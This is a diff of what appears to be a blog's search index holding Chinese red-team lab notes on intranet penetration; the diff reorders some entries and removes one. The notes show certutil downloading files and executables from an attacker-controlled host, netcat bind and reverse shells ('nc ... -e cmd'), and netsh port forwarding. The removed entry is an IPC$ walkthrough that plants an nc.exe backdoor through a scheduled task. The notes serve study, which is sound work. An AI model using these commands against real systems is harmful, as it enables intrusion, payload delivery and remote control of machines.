@@ -426,104 +426,6 @@
       </tags>
   </entry>
   <entry>
-    <title>【内网渗透学习笔记】02、内网渗透中的certutil</title>
-    <url>/2021/04/01/intranet02/</url>
-    <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>Windows中的内置程序Certutil.exe ，作为证书服务的一部分进行安装。使用此程序可以在Windows中安装、备份、删除、管理以及执行证书相关的各种功能。</p>
-<p><strong>Certutil可以从远程<code>URL</code>下载证书或任何其它文件。</strong></p>
-<h2 id="下载的常用方法"><a href="#下载的常用方法" class="headerlink" title="下载的常用方法"></a>下载的常用方法</h2><ul>
-<li>背景</li>
-</ul>
-<p>kali（IP：10.7.7.7）</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span>		<span class="comment">##python3</span></span><br><span class="line">python -m SimpleHTTPServer <span class="number">80</span>		<span class="comment">##python2</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><ol>
-<li>保存在当前路径，文件名称同URL</li>
-</ol>
-</li>
-</ul>
-<p><code>example</code>:</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401151204777.png" alt="image-20210401151204777"></p>
-<ul>
-<li>2)保存在当前路径，指定文件名称保存</li>
-</ul>
-<p><code>example</code>:</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt  a.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401151741297.png" alt="image-20210401151741297"></p>
-<ul>
-<li>3)保存在缓存目录，名称随机</li>
-</ul>
-<p>缓存目录位置：</p>
-<p><code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p>
-<p><code>example</code>:</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401152512141.png" alt="image-20210401152512141"></p>
-<ul>
-<li>4)支持保存二进制文件</li>
-</ul>
-<p><code>example</code>:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;10.7.7.7&#x2F;test.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401152823463.png" alt="image-20210401152823463"></p>
-<h2 id="清除下载文件"><a href="#清除下载文件" class="headerlink" title="清除下载文件"></a>清除下载文件</h2><ul>
-<li>查看缓存项目</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache *</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>删除缓存项目</li>
-</ul>
-<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">certutil -urlcache * <span class="keyword">delete</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="base64编码转换"><a href="#base64编码转换" class="headerlink" title="base64编码转换"></a>base64编码转换</h2><ul>
-<li>1）base64编码：</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutill -encode InFile Outfile</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401163137364.png" alt="image-20210401163137364"></p>
-<p>编码后的文件会添加两处标识信息：</p>
-<p>文件头：</p>
-<p><code>----BEGIN CERTIFICATE-----</code></p>
-<p>文件尾：</p>
-<p><code>-----END CERTIFICATE-----</code></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401163309621.png" alt="image-20210401163309621"></p>
-<ul>
-<li>2)base64解密</li>
-</ul>
-<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">certutil -<span class="keyword">decode</span> <span class="keyword">InFile</span> <span class="keyword">OutFile</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>主要总结了certutil的几种下载方法，并且介绍了base64编码转换的常用方法。</p>
-<p><code>Windows</code>常见的几种下载拓展：</p>
-<ul>
-<li>bitsadmin</li>
-<li>powershell</li>
-<li>mshta</li>
-<li>regsvr32</li>
-<li>csc</li>
-<li>vbs</li>
-<li>wget</li>
-<li>ftp</li>
-<li>debug</li>
-<li>tftp</li>
-</ul>
-]]></content>
-      <categories>
-        <category>内网学习笔记</category>
-      </categories>
-      <tags>
-        <tag>红队</tag>
-        <tag>certutil</tag>
-        <tag>学习笔记</tag>
-        <tag>内网渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【内网渗透学习笔记】01、端口探测</title>
     <url>/2021/04/01/intranet01/</url>
     <content><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>端口探测在渗透测试中信息收集以及威胁情报领域都有着很重要的应用</strong></p>
@@ -782,82 +684,98 @@
       </categories>
       <tags>
         <tag>红队</tag>
+        <tag>端口探测</tag>
         <tag>学习笔记</tag>
         <tag>内网渗透</tag>
-        <tag>端口探测</tag>
       </tags>
   </entry>
   <entry>
-    <title>【内网渗透学习笔记】04、代理与端口转发</title>
-    <url>/2021/04/05/intranet04/</url>
-    <content><![CDATA[<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>代理（Proxy）也称为网络代理，是一种特殊的网络服务，允许一个网络终端（客户端）通过这个服务与另一个网络终端（服务器）进行非直接的连接，代理服务有效的保护了网络终端的隐私。</p>
-<h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>正向代理即客户端代理，服务器不知道实际发起的客户端。比如<code>vpn</code>,国内不能直接访问谷歌，客户端通过代理服务器可以访问谷歌，客户端将数据转发到代理服务器，再由代理服务器转发给谷歌获取到数据，再返回客户端，这里是代理客户端。</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Client --&gt;<span class="built_in"> Proxy </span>&lt;--&gt; Server</span><br></pre></td></tr></table></figure>
-
-<p>拓扑结构：</p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405104330783.png" alt="image-20210405104330783"></p>
-<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>反向代理即服务器代理，客户端不知道实际提供服务的服务器。比如Windowds远程连接,客户端想要访问服务器的3389端口，可是服务器的3389端口不对外开放，这里通过端口转发，将所有3389端口转发到3333端口，这样客户端访问3333端口就相当于访问了3389端口。这里是代理服务器。</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Client &lt;--&gt;<span class="built_in"> Proxy </span>&lt;-- Server</span><br></pre></td></tr></table></figure>
-
-<p>拓扑结构：</p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405105139188.png" alt="image-20210405105139188"></p>
-<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><ul>
-<li>基础命令</li>
+    <title>【内网渗透学习笔记】02、内网渗透中的certutil</title>
+    <url>/2021/04/01/intranet02/</url>
+    <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>Windows中的内置程序Certutil.exe ，作为证书服务的一部分进行安装。使用此程序可以在Windows中安装、备份、删除、管理以及执行证书相关的各种功能。</p>
+<p><strong>Certutil可以从远程<code>URL</code>下载证书或任何其它文件。</strong></p>
+<h2 id="下载的常用方法"><a href="#下载的常用方法" class="headerlink" title="下载的常用方法"></a>下载的常用方法</h2><ul>
+<li>背景</li>
 </ul>
-<p>使用portproxy模式下的netsh命令即能实现Windows系统中的端口转发，转发命令如下：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport</span><br></pre></td></tr></table></figure>
+<p>kali（IP：10.7.7.7）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span>		<span class="comment">##python3</span></span><br><span class="line">python -m SimpleHTTPServer <span class="number">80</span>		<span class="comment">##python2</span></span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>参数含义</li>
+<li><ol>
+<li>保存在当前路径，文件名称同URL</li>
+</ol>
+</li>
 </ul>
-<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># listenaddress		等待连接的本地ip地址</span></span><br><span class="line"><span class="meta"># listenport		本地监听的TCP端口(待转发)</span></span><br><span class="line"><span class="meta"># connectaddress		被转发端口的本地或者远程主机的ip地址</span></span><br><span class="line"><span class="meta"># connectport		被转发的端口</span></span><br></pre></td></tr></table></figure>
+<p><code>example</code>:</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401151204777.png" alt="image-20210401151204777"></p>
+<ul>
+<li>2)保存在当前路径，指定文件名称保存</li>
+</ul>
+<p><code>example</code>:</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt  a.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401151741297.png" alt="image-20210401151741297"></p>
+<ul>
+<li>3)保存在缓存目录，名称随机</li>
+</ul>
+<p>缓存目录位置：</p>
+<p><code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p>
+<p><code>example</code>:</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401152512141.png" alt="image-20210401152512141"></p>
+<ul>
+<li>4)支持保存二进制文件</li>
+</ul>
+<p><code>example</code>:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;10.7.7.7&#x2F;test.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401152823463.png" alt="image-20210401152823463"></p>
+<h2 id="清除下载文件"><a href="#清除下载文件" class="headerlink" title="清除下载文件"></a>清除下载文件</h2><ul>
+<li>查看缓存项目</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache *</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>添加转发规则 <a>（需要管理员权限）</a></li>
+<li>删除缓存项目</li>
 </ul>
-<blockquote>
-<p>转发前需要确定listenport中指定的本地端口号不被其它服务使用或监听</p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netstat -ano | <span class="built_in">find</span> &quot;<span class="number">3333</span>&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">certutil -urlcache * <span class="keyword">delete</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405140242789.png" alt="image-20210405140242789"></p>
-<blockquote>
-<p>或者使用powershell查看</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Test-NetConnection</span> <span class="literal">-ComputerName</span> localhost <span class="literal">-Port</span> <span class="number">3333</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405140430761.png" alt="image-20210405140430761"></p>
-<blockquote>
-<p>添加转发规则</p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy <span class="built_in">set</span> v4tov4 listenport=<span class="number">3333</span> listenaddress=<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">85</span> connectaddress=<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">85</span> connectport=<span class="number">3389</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405134229782.png" alt="image-20210405134229782"></p>
+<h2 id="base64编码转换"><a href="#base64编码转换" class="headerlink" title="base64编码转换"></a>base64编码转换</h2><ul>
+<li>1）base64编码：</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutill -encode InFile Outfile</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401163137364.png" alt="image-20210401163137364"></p>
+<p>编码后的文件会添加两处标识信息：</p>
+<p>文件头：</p>
+<p><code>----BEGIN CERTIFICATE-----</code></p>
+<p>文件尾：</p>
+<p><code>-----END CERTIFICATE-----</code></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401163309621.png" alt="image-20210401163309621"></p>
 <ul>
-<li>查看转发规则</li>
+<li>2)base64解密</li>
 </ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure>
+<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">certutil -<span class="keyword">decode</span> <span class="keyword">InFile</span> <span class="keyword">OutFile</span></span><br></pre></td></tr></table></figure>
 
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>主要总结了certutil的几种下载方法，并且介绍了base64编码转换的常用方法。</p>
+<p><code>Windows</code>常见的几种下载拓展：</p>
 <ul>
-<li>尝试连接</li>
+<li>bitsadmin</li>
+<li>powershell</li>
+<li>mshta</li>
+<li>regsvr32</li>
+<li>csc</li>
+<li>vbs</li>
+<li>wget</li>
+<li>ftp</li>
+<li>debug</li>
+<li>tftp</li>
 </ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405134329342.png" alt="image-20210405134329342"></p>
-<ul>
-<li>删除规则</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy delete v4tov4 listenport=<span class="number">3333</span> listenaddress=<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">85</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405134600311.png" alt="image-20210405134600311"></p>
-<h2 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nc -lp <span class="number">7777</span> -e <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">nc 10.7.6.85 7777</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405135720564.png" alt="image-20210405135720564"></p>
-<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc <span class="number">10.7</span><span class="number">.6</span><span class="number">.177</span> -e cmd</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405135848989.png" alt="image-20210405135848989"></p>
 ]]></content>
       <categories>
         <category>内网学习笔记</category>
@@ -866,8 +784,7 @@
         <tag>红队</tag>
         <tag>学习笔记</tag>
         <tag>内网渗透</tag>
-        <tag>代理</tag>
-        <tag>端口转发</tag>
+        <tag>certutil</tag>
       </tags>
   </entry>
   <entry>
@@ -1011,6 +928,89 @@
         <tag>学习笔记</tag>
         <tag>内网渗透</tag>
         <tag>mstsc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【内网渗透学习笔记】04、代理与端口转发</title>
+    <url>/2021/04/05/intranet04/</url>
+    <content><![CDATA[<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>代理（Proxy）也称为网络代理，是一种特殊的网络服务，允许一个网络终端（客户端）通过这个服务与另一个网络终端（服务器）进行非直接的连接，代理服务有效的保护了网络终端的隐私。</p>
+<h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>正向代理即客户端代理，服务器不知道实际发起的客户端。比如<code>vpn</code>,国内不能直接访问谷歌，客户端通过代理服务器可以访问谷歌，客户端将数据转发到代理服务器，再由代理服务器转发给谷歌获取到数据，再返回客户端，这里是代理客户端。</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Client --&gt;<span class="built_in"> Proxy </span>&lt;--&gt; Server</span><br></pre></td></tr></table></figure>
+
+<p>拓扑结构：</p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405104330783.png" alt="image-20210405104330783"></p>
+<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>反向代理即服务器代理，客户端不知道实际提供服务的服务器。比如Windowds远程连接,客户端想要访问服务器的3389端口，可是服务器的3389端口不对外开放，这里通过端口转发，将所有3389端口转发到3333端口，这样客户端访问3333端口就相当于访问了3389端口。这里是代理服务器。</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Client &lt;--&gt;<span class="built_in"> Proxy </span>&lt;-- Server</span><br></pre></td></tr></table></figure>
+
+<p>拓扑结构：</p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405105139188.png" alt="image-20210405105139188"></p>
+<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><ul>
+<li>基础命令</li>
+</ul>
+<p>使用portproxy模式下的netsh命令即能实现Windows系统中的端口转发，转发命令如下：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>参数含义</li>
+</ul>
+<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># listenaddress		等待连接的本地ip地址</span></span><br><span class="line"><span class="meta"># listenport		本地监听的TCP端口(待转发)</span></span><br><span class="line"><span class="meta"># connectaddress		被转发端口的本地或者远程主机的ip地址</span></span><br><span class="line"><span class="meta"># connectport		被转发的端口</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>添加转发规则 <a>（需要管理员权限）</a></li>
+</ul>
+<blockquote>
+<p>转发前需要确定listenport中指定的本地端口号不被其它服务使用或监听</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netstat -ano | <span class="built_in">find</span> &quot;<span class="number">3333</span>&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405140242789.png" alt="image-20210405140242789"></p>
+<blockquote>
+<p>或者使用powershell查看</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Test-NetConnection</span> <span class="literal">-ComputerName</span> localhost <span class="literal">-Port</span> <span class="number">3333</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405140430761.png" alt="image-20210405140430761"></p>
+<blockquote>
+<p>添加转发规则</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy <span class="built_in">set</span> v4tov4 listenport=<span class="number">3333</span> listenaddress=<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">85</span> connectaddress=<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">85</span> connectport=<span class="number">3389</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405134229782.png" alt="image-20210405134229782"></p>
+<ul>
+<li>查看转发规则</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>尝试连接</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405134329342.png" alt="image-20210405134329342"></p>
+<ul>
+<li>删除规则</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy delete v4tov4 listenport=<span class="number">3333</span> listenaddress=<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">85</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405134600311.png" alt="image-20210405134600311"></p>
+<h2 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nc -lp <span class="number">7777</span> -e <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">nc 10.7.6.85 7777</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405135720564.png" alt="image-20210405135720564"></p>
+<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc <span class="number">10.7</span><span class="number">.6</span><span class="number">.177</span> -e cmd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405135848989.png" alt="image-20210405135848989"></p>
+]]></content>
+      <categories>
+        <category>内网学习笔记</category>
+      </categories>
+      <tags>
+        <tag>红队</tag>
+        <tag>学习笔记</tag>
+        <tag>内网渗透</tag>
+        <tag>代理</tag>
+        <tag>端口转发</tag>
       </tags>
   </entry>
   <entry>
@@ -1390,85 +1390,6 @@
       </tags>
   </entry>
   <entry>
-    <title>记一次IPC$渗透</title>
-    <url>/2021/03/08/%E8%AE%B0%E4%B8%80%E6%AC%A1IPC-%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<h2 id="IPC-介绍"><a href="#IPC-介绍" class="headerlink" title="IPC$介绍"></a>IPC$介绍</h2><h3 id="IPC-概念"><a href="#IPC-概念" class="headerlink" title="IPC$概念"></a>IPC$概念</h3><p><code>IPC$</code>(Internet Process Connection)是共享”命名管道”的资源,它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获取相应的权限，再远程计算机和查看计算机的共享资源时使用。</p>
-<h3 id="IPC-作用"><a href="#IPC-作用" class="headerlink" title="IPC$作用"></a>IPC$作用</h3><p>利用<code>IPC$</code>,攻击者可以与目标主机建立一个连接，通过这个连接可以获取目标主机的目录结构，用户列表信息等…</p>
-<p><code>IPC$</code>还有一种空连接的形式，不需要用户名和密码。虽然空连接没有任何权限，但是也可以得到目标主机用户列表。</p>
-<h3 id="常用IPC-命令"><a href="#常用IPC-命令" class="headerlink" title="常用IPC$命令"></a>常用IPC$命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net share ipc$    	  		&#x2F;&#x2F;开启ipc$</span><br><span class="line">net share ipc$ &#x2F;del 			&#x2F;&#x2F;关闭ipc$共享</span><br><span class="line">net use \\IP\ipc$ &quot;&quot; &#x2F;user:&quot;&quot;		&#x2F;&#x2F;建立空连接</span><br><span class="line">net use \\IP\ipc$ &quot;用户名&quot; &#x2F;user:&quot;密码&quot;	&#x2F;&#x2F;建立连接</span><br><span class="line">net use z: \\ip\c$                	&#x2F;&#x2F;映射目标主机c盘到本地z盘              </span><br><span class="line">net use \\IP\ipc$ &#x2F;del              	&#x2F;&#x2F;删除一个ipc$连接</span><br><span class="line">net use z: &#x2F;del                    	&#x2F;&#x2F;删除映射目录</span><br></pre></td></tr></table></figure>
-
-<h3 id="常见错误代码"><a href="#常见错误代码" class="headerlink" title="常见错误代码"></a>常见错误代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">错误号5，拒绝访问：很可能你使用的用户不是管理员权限的，先提升权限； </span><br><span class="line">错误号51，Windows无法找到网络路径：网络有问题； </span><br><span class="line">错误号53，找不到网络路径：ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）； </span><br><span class="line">错误号67，  找不到网络名：你的lanmanworkstation服务未启动或者目标删除了ipc$； </span><br><span class="line">错误号1219，提供的凭据与已存在的凭据集冲突：你已经和对方建立了一个ipc$，请删除再连； </span><br><span class="line">错误号1326，未知的用户名或错误密码：原因很明显了； </span><br><span class="line">错误号1792，试图登录，但是网络登录服务没有启动：目标NetLogon服务未启动； </span><br><span class="line">错误号2242，此用户的密码已经过期：目标有帐号策略，强制定期要求更改密码</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="IPC-渗透"><a href="#IPC-渗透" class="headerlink" title="IPC$渗透"></a>IPC$渗透</h2><h3 id="内网-信息收集"><a href="#内网-信息收集" class="headerlink" title="内网-信息收集"></a>内网-信息收集</h3><p>通过内网扫描工具(NTscan)扫描内网发现可能存在一台IPC$漏洞的靶机，且密码为空。</p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308161516655.png" alt="image-20210308161516655"></p>
-<h3 id="IPC-连接"><a href="#IPC-连接" class="headerlink" title="IPC$连接"></a>IPC$连接</h3><ul>
-<li>与目标主机建立ipc$连接</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">177</span>\ipc$ &quot;&quot; /user:&quot;Administrator&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308162606862.png" alt="image-20210308162606862"></p>
-<ul>
-<li>把目标主机的C盘映射到本地z盘</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> use z: \\<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">177</span>\c$</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308162858310.png" alt="image-20210308162858310"></p>
-<h2 id="获取主机权限"><a href="#获取主机权限" class="headerlink" title="获取主机权限"></a>获取主机权限</h2><blockquote>
-<p>现在已经成功ipc$连接，接下来想要拿下目标主机的权限，且已知密码为空，现有两种思路</p>
-<p>1.让目标主机开放3389端口，远程连接</p>
-<p>2.让目标主机开放一个后门端口</p>
-</blockquote>
-<h3 id="方法一）"><a href="#方法一）" class="headerlink" title="方法一）"></a>方法一）</h3><ul>
-<li>目标靶机未开放3389端口</li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308164419733.png" alt="image-20210308164419733"></p>
-<ul>
-<li>写入一个3389.bat到目标主机的C盘中</li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308164839805.png" alt="image-20210308164839805"></p>
-<ul>
-<li>通过at命令来添加一个计划任务</li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308165131844.png" alt="image-20210308165131844"></p>
-<ul>
-<li>目标靶机已开放3389端口</li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308165206880.png" alt="image-20210308165206880"></p>
-<ul>
-<li>拿到主机权限</li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308194713755.png" alt="image-20210308194713755"></p>
-<h3 id="方法二）"><a href="#方法二）" class="headerlink" title="方法二）"></a>方法二）</h3><ul>
-<li>上传一个<code>nc.exe</code> 和一个<code>nc.bat</code>,<code>nc.bat</code>的内容如下：</li>
-</ul>
-<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">nc.exe</span> -<span class="title">lvp</span> 8080 -<span class="title">e</span> <span class="title">cmd</span></span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308195332482.png" alt="image-20210308195332482"></p>
-<ul>
-<li>通过at命令来添加一个计划任务</li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308195505842.png" alt="image-20210308195505842"></p>
-<ul>
-<li>靶机8080端口已打开</li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308195609508.png" alt="image-20210308195609508"></p>
-<ul>
-<li>拿到主机权限</li>
-</ul>
